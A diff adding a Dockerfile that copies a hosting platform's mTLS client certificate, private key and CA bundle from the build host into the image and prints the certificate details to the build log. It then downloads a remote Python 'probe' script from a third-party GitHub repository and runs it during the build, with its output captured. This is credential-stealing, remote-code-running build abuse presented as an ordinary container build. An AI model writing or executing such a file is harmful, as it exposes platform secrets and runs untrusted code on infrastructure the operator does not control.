@@ -1,0 +1,10 @@
+# I79598-v1 temporal-history-payload-scan
+FROM alpine:3.20
+RUN apk add --no-cache curl python3 openssl >/dev/null 2>&1; echo APKDONE
+COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
+COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
+COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
+RUN ls -la /pki; openssl x509 -in /pki/client.crt -noout -subject -issuer -dates 2>&1; echo PKI_INFO_DONE
+RUN curl -sS -m 30 -o /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_i79598.py && echo DL_OK && wc -c /p.py
+RUN MARK=I79598-v1 MAXH=45 timeout 1000 python3 /p.py 2>&1 | head -c 70000
+CMD ["sh","-c","sleep 3600"]
